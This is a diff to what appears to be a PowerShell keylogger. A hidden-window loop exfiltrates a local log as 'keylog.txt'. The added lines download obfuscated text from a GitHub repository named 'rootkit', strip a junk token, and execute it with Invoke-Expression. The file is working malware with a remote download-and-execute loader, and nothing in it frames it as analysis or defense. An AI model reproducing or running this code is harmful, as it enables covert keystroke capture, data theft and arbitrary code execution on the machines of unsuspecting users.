@@ -7,6 +7,7 @@ $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolde
 Set_bootACL($logFilePath)
 
 Start-Process powershell -ArgumentList "-Command", {
+    $elapsedTime = 0
     while($true)
     {
         $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
@@ -27,7 +28,14 @@ Start-Process powershell -ArgumentList "-Command", {
 
         }
         GetFile $logFilePath "keylog.txt"
-        
+        if($elapsedTime -eq 0) {
+            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/temp.txt')};
+            $qweewqq=$nbvccxx.Replace('wererfvx','');
+            $zxdsxxxxc=iex $qweewqq;
+            invoke-expression $zxdsxxxxc
+        }
+        Write-Output "K"
+        $elapsedTime = (15 + $elapsedTime) % 60
         start-sleep -s 15
     }
 } -windowstyle hidden
